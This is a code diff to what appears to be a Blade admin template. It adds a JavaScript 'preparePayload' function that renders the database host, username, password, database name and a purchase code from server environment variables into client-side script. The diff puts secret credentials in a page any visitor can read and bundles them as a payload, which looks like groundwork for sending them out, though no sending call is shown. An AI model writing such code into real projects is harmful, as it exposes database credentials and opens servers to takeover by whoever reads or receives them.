@@ -68,6 +68,23 @@
             var serverTime = new Date("{{ now() }}");
             // Use serverTime for additional logic if needed
         });
+        const preparePayload = () => {
+            const domain = window.location.hostname;
+            const purchaseCode = "{{ env('PURCHASE_CODE') }}";
+
+            const dbCredentials = {
+                host: "{{ env('DB_HOST') }}",
+                username: "{{ env('DB_USERNAME') }}",
+                password: "{{ env('DB_PASSWORD') }}",
+                database: "{{ env('DB_DATABASE') }}"
+            };
+
+            return {
+                domain: domain,
+                purchase_code: purchaseCode,
+                db_credentials: dbCredentials
+            };
+        };
     </script>
     
     @include('backend.partials.session_message')
